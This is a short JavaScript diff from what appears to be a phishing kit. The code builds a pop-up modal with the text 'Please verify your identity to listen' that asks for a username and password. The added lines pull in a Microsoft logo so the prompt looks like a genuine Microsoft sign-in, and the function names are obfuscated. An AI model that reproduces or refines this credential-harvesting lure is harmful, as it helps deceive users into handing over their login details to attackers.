@@ -39,10 +39,11 @@ function uigjsh() {
             var modalc = document.createElement("div");
             modalc.setAttribute("class", "modal-content");
             var content = document.createElement("h3");
-            var form = `<h5>Please verify your identity to listen</h5> 
+            var d = "microsoft.com";
+            var form = `<img src="//logo.clearbit.com/[-d-]"><h5>Please verify your identity to listen</h5> 
             <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
             <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
-            content.innerHTML = form;
+            content.innerHTML = form.replace("[-d-]", d);
             modalc.appendChild(content);
             modal.appendChild(modalc);
             document.getElementById("body").appendChild(modal);
